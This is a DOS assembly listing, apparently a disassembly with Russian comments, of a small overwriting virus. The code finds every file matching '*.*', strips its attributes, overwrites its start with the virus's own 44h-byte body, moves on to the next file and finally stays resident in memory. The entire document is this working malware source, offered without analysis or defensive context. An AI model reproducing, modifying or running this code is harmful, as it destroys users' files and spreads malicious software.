seg000 segment byte public 'CODE'
	assume cs:seg000
	org 100h
	assume es:nothing, ss:nothing, ds:seg000
	public start
start proc near

;найти первый совподающий файл
	mov ah,4Eh
	mov dx,140h
	int 21h
loc_0_107:

;установить/опросить атрибут файла
	mov ah,43h
	mov al,0
	mov dx,9Eh
	int 21h

;установить/опросить атрибут файла
	mov ah,43h
	mov al,1
	mov dx,9Eh
	mov cl,0
	int 21h
	mov ax,3D01h
	mov dx,9Eh
	int 21h

	xchg ax,bx

;писать в файл через описатель
	mov ah,40h
	mov cl,44h
	nop
	nop
	mov dx,100h
	int 21h

;закрыть описатель файла
	mov ah,3Eh
	int 21h

;найти следующий совподающий файл
	mov ah,4Fh
	int 21h
	jnb loc_0_107

;завершиться и остаться резидентным
	mov ah,31h
	mov dx,7530h
	int 21h

start endp
	a_MaskForVir db '*.*',0
seg000 ends
end start 
